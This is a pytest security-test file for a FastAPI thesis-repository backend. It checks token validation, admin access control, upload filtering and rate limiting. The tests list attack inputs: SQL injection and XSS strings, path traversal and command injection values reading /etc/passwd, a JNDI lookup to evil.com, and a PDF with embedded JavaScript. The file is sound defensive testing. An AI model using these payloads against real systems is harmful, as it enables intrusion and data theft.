"""
Security Testing for theses.ma
"""

import pytest
import jwt
from datetime import datetime, timedelta
from fastapi.testclient import TestClient
from main import Settings

class TestAuthenticationSecurity:
    """Test authentication security measures."""
    
    def test_jwt_token_security(self, client):
        """Test JWT token security measures."""
        settings = Settings()
        
        # Test with invalid secret
        invalid_payload = {
            "sub": "test@example.com",
            "user_id": "test-user",
            "role": "admin",
            "exp": datetime.utcnow() + timedelta(minutes=30)
        }
        
        invalid_token = jwt.encode(invalid_payload, "invalid-secret", algorithm="HS256")
        headers = {"Authorization": f"Bearer {invalid_token}"}
        
        response = client.get("/auth/profile", headers=headers)
        assert response.status_code == 401
    
    def test_expired_token_handling(self, client):
        """Test handling of expired tokens."""
        settings = Settings()
        
        # Create expired token
        expired_payload = {
            "sub": "test@example.com",
            "user_id": "test-user",
            "role": "admin",
            "exp": datetime.utcnow() - timedelta(minutes=30)  # Expired
        }
        
        expired_token = jwt.encode(expired_payload, settings.JWT_SECRET_KEY, algorithm=settings.JWT_ALGORITHM)
        headers = {"Authorization": f"Bearer {expired_token}"}
        
        response = client.get("/auth/profile", headers=headers)
        assert response.status_code == 401
    
    def test_malformed_token_handling(self, client):
        """Test handling of malformed tokens."""
        malformed_tokens = [
            "invalid-token",
            "Bearer invalid-token",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            None
        ]
        
        for token in malformed_tokens:
            headers = {"Authorization": f"Bearer {token}"} if token else {}
            response = client.get("/auth/profile", headers=headers)
            assert response.status_code == 401
    
    def test_token_injection_attempts(self, client):
        """Test various token injection attempts."""
        injection_attempts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "admin' OR '1'='1",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for attempt in injection_attempts:
            headers = {"Authorization": f"Bearer {attempt}"}
            response = client.get("/auth/profile", headers=headers)
            assert response.status_code == 401
    
    def test_privilege_escalation_attempts(self, client, user_token):
        """Test privilege escalation attempts."""
        # Try to access admin endpoints with user token
        admin_endpoints = [
            "/admin/universities",
            "/admin/faculties",
            "/admin/schools",
            "/admin/departments",
            "/admin/categories",
            "/admin/keywords",
            "/admin/academic-persons",
            "/admin/degrees",
            "/admin/languages",
            "/admin/theses",
            "/admin/statistics"
        ]
        
        headers = {"Authorization": f"Bearer {user_token}"}
        
        for endpoint in admin_endpoints:
            response = client.get(endpoint, headers=headers)
            assert response.status_code == 403, f"Endpoint {endpoint} should be forbidden for users"

class TestInputValidationSecurity:
    """Test input validation security."""
    
    def test_sql_injection_attempts(self, client, auth_headers_admin):
        """Test SQL injection prevention."""
        sql_injection_payloads = [
            "'; DROP TABLE universities; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "1; DELETE FROM universities; --"
        ]
        
        for payload in sql_injection_payloads:
            # Test in search parameter
            response = client.get(f"/admin/universities?search={payload}", headers=auth_headers_admin)
            assert response.status_code in [200, 400, 422]  # Should not cause 500 error
            
            # Test in POST data
            university_data = {
                "name_fr": payload,
                "name_en": "Test University",
                "acronym": "UT"
            }
            response = client.post("/admin/universities", json=university_data, headers=auth_headers_admin)
            assert response.status_code in [201, 400, 422]  # Should validate input properly
    
    def test_xss_prevention(self, client, auth_headers_admin):
        """Test XSS prevention in input fields."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//"
        ]
        
        for payload in xss_payloads:
            university_data = {
                "name_fr": payload,
                "name_en": "Test University",
                "acronym": "UT"
            }
            response = client.post("/admin/universities", json=university_data, headers=auth_headers_admin)
            
            # Should either accept (with proper escaping) or reject the input
            if response.status_code == 201:
                # If accepted, check that the response doesn't contain unescaped script tags
                response_data = response.json()
                assert "<script>" not in response_data.get("name_fr", "")
    
    def test_path_traversal_prevention(self, client, auth_headers_admin):
        """Test path traversal prevention."""
        path_traversal_payloads = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test in file upload filename
            files = {"file": (payload, b"test content", "application/pdf")}
            response = client.post("/admin/thesis-content/upload-file", files=files, headers=auth_headers_admin)
            
            # Should reject or sanitize the filename
            assert response.status_code in [200, 400, 422]
    
    def test_command_injection_prevention(self, client, auth_headers_admin):
        """Test command injection prevention."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(whoami)"
        ]
        
        for payload in command_injection_payloads:
            university_data = {
                "name_fr": f"Test University {payload}",
                "name_en": "Test University",
                "acronym": "UT"
            }
            response = client.post("/admin/universities", json=university_data, headers=auth_headers_admin)
            
            # Should handle input safely
            assert response.status_code in [201, 400, 422]

class TestFileUploadSecurity:
    """Test file upload security."""
    
    def test_file_type_validation(self, client, auth_headers_admin):
        """Test file type validation."""
        dangerous_files = [
            ("malware.exe", b"MZ", "application/x-executable"),
            ("script.php", b"<?php echo 'hello'; ?>", "application/x-php"),
            ("shell.sh", b"#!/bin/bash\necho 'hello'", "application/x-sh"),
            ("virus.js", b"alert('virus')", "application/javascript")
        ]
        
        for filename, content, content_type in dangerous_files:
            files = {"file": (filename, content, content_type)}
            response = client.post("/admin/thesis-content/upload-file", files=files, headers=auth_headers_admin)
            
            # Should reject non-PDF files
            assert response.status_code == 400
    
    def test_file_size_limits(self, client, auth_headers_admin):
        """Test file size limits."""
        # Create a large file (simulate oversized file)
        large_content = b"x" * (200 * 1024 * 1024)  # 200MB
        files = {"file": ("large_file.pdf", large_content, "application/pdf")}
        
        response = client.post("/admin/thesis-content/upload-file", files=files, headers=auth_headers_admin)
        
        # Should reject oversized files
        assert response.status_code == 413
    
    def test_malicious_pdf_prevention(self, client, auth_headers_admin):
        """Test prevention of malicious PDF files."""
        # Create PDF with embedded JavaScript
        malicious_pdf = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /JavaScript
/JS (app.alert("Malicious PDF");)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
0000000173 00000 n 
0000000301 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
394
%%EOF"""
        
        files = {"file": ("malicious.pdf", malicious_pdf, "application/pdf")}
        response = client.post("/admin/thesis-content/upload-file", files=files, headers=auth_headers_admin)
        
        # Should either reject or sanitize the PDF
        assert response.status_code in [200, 400, 422]

class TestRateLimiting:
    """Test rate limiting and abuse prevention."""
    
    def test_login_brute_force_protection(self, client):
        """Test protection against brute force login attempts."""
        # Attempt multiple failed logins
        for i in range(10):
            login_data = {
                "email": "test@example.com",
                "password": f"wrong_password_{i}"
            }
            response = client.post("/auth/login", json=login_data)
            
            # After several attempts, should implement rate limiting
            if i > 5:
                assert response.status_code in [401, 429]  # 429 = Too Many Requests
    
    def test_api_abuse_protection(self, client, auth_headers_admin):
        """Test protection against API abuse."""
        # Make many requests quickly
        for i in range(100):
            response = client.get("/admin/universities", headers=auth_headers_admin)
            
            # Should not fail due to rate limiting for legitimate admin
            assert response.status_code in [200, 429]
            
            if response.status_code == 429:
                break  # Rate limit reached
    
    def test_search_abuse_protection(self, client):
        """Test protection against search abuse."""
        # Make many search requests
        for i in range(50):
            response = client.get(f"/theses?q=search_term_{i}")
            
            # Should handle gracefully
            assert response.status_code in [200, 429]

class TestDataPrivacy:
    """Test data privacy and information disclosure."""
    
    def test_user_data_privacy(self, client, auth_headers_user):
        """Test that user data is not exposed inappropriately."""
        response = client.get("/auth/profile", headers=auth_headers_user)
        assert response.status_code == 200
        
        data = response.json()
        
        # Should not expose sensitive information
        sensitive_fields = ["password_hash", "internal_id", "secret_key"]
        for field in sensitive_fields:
            assert field not in data
    
    def test_error_message_security(self, client):
        """Test that error messages don't leak sensitive information."""
        # Test with invalid user ID
        response = client.get("/admin/universities/00000000-0000-0000-0000-000000000000")
        
        # Should not expose database structure or internal details
        if response.status_code == 404:
            error_data = response.json()
            assert "database" not in error_data.get("detail", "").lower()
            assert "table" not in error_data.get("detail", "").lower()
    
    def test_admin_data_isolation(self, client, auth_headers_admin, auth_headers_user):
        """Test that admin data is isolated from regular users."""
        # Admin creates a university
        university_data = {
            "name_fr": "Université Privée",
            "name_en": "Private University",
            "acronym": "PU"
        }
        
        admin_response = client.post("/admin/universities", json=university_data, headers=auth_headers_admin)
        assert admin_response.status_code == 201
        
        # Regular user should not be able to access admin endpoints
        user_response = client.get("/admin/universities", headers=auth_headers_user)
        assert user_response.status_code == 403

class TestCORSAndHeaders:
    """Test CORS and security headers."""
    
    def test_cors_configuration(self, client):
        """Test CORS configuration."""
        response = client.options("/theses")
        
        # Should include proper CORS headers
        assert "Access-Control-Allow-Origin" in response.headers
        assert "Access-Control-Allow-Methods" in response.headers
    
    def test_security_headers(self, client):
        """Test security headers."""
        response = client.get("/")
        
        # Should include security headers
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security"
        ]
        
        for header in security_headers:
            # At least some security headers should be present
            if header in response.headers:
                assert response.headers[header] is not None